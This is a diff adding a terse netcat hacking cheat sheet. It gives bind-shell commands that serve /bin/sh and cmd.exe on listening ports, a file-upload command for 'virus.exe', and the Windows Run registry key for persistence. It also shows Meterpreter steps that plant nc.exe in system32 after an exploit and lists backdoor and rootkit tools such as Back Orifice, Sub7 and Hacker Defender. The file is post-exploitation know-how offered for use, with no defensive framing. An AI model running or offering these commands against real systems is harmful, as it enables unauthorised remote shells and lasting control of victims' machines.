@@ -1,0 +1,29 @@
+listen on host, connect on remote
+nc -l <host> -p <port> # on host
+nc <ip> <port> # on target
+
+-L start in listener mode
+-u send udp packets
+-e execute command
+
+windows persistence
+HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run
+
+upload
+nc -l -p 7777 > virus.exe
+
+shell
+nc -l -p 12345 -e /bin/sh
+nc.exe -L -p 12345 c:\Windows\System32\cmd.exe
+
+upload after exploit using meterpreter shell.
+meterpreter > upload nc.exe c:\\windows\system32
+meterpreter > nc -L -p 5777 -e cmd.exe
+
+cryptcat
+netbus
+back orifice
+sub seven (sub7)
+DirectXploit
+the modular ButtPlugins for BO
+Hacker Defender
